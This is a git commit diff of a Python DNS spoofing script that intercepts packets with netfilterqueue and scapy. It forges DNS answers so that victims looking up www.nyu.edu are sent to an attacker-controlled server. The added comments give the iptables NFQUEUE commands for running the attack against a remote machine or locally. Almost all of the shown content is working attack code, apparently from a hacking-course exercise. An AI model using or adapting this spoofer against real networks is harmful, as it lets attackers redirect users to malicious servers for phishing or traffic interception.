7b93999979c5cf64cc41cd683fa894e8404c2fac
Saad Shahzad <spider32277223@gmail.com>
2020-04-07 17:39:30 -0400

    DNS SPOOFER Completed. Works on Http websites only

--- dns_spoofer.py
+++ dns_spoofer.py
@@ -2,13 +2,13 @@
 import netfilterqueue
 import scapy.all as scapy
 
-def process_packet(packets):
+def spoofed_packet(packets):
     scapy_packet = scapy.IP(packets.get_payload()) # converting packet to scapy packet i.e. IP layer
     if scapy_packet.haslayer(scapy.DNSRR): # To look for DNS Response
         qname = scapy_packet[scapy.DNSQR].qname # if the victim is looking for the target website, qname is the website
         if "www.nyu.edu" in qname: # To check if the website is in the qname
             print("[+] Spoofing target")
-            spoof_ans = scapy.DNSRR(rrname=qname, rdata="Put IP address of your server here") # To redirect the user to bing.com to my server
+            spoof_ans = scapy.DNSRR(rrname=qname, rdata="Set IP address of your server") # To redirect the user to nyu.edu to my server
                                                                        # Where rrname is equal to the qname
                                                                        # P.S We are creating a DNS RESPONSE
             scapy_packet[scapy.DNS].an = spoof_ans # Modifying answer field
@@ -26,6 +26,11 @@ def process_packet(packets):
     packets.accept()  # accept packets
 
 queue = netfilterqueue.NetfilterQueue()  # Creating instance of netfilterqueue object
-queue.bind(0, process_packet)  # to bind with the connceted queue. The 0 represents the queue no & the process_packet is
+queue.bind(0, spoofed_packet)  # to bind with the connceted queue. The 0 represents the queue no & the process_packet is
 # the call back function
 queue.run() # to run the function
+
+# To Spoof on remote computer (Linux machine): iptables -I FORWARD -j NFQUEUE --queue-num 0
+# To Spoof on your local computer (Linux machine): iptables -I OUTPUT -j NFQUEUE --queue-num 0
+#                                                  iptables -I INPUT -j NFQUEUE --queue-num 0
+
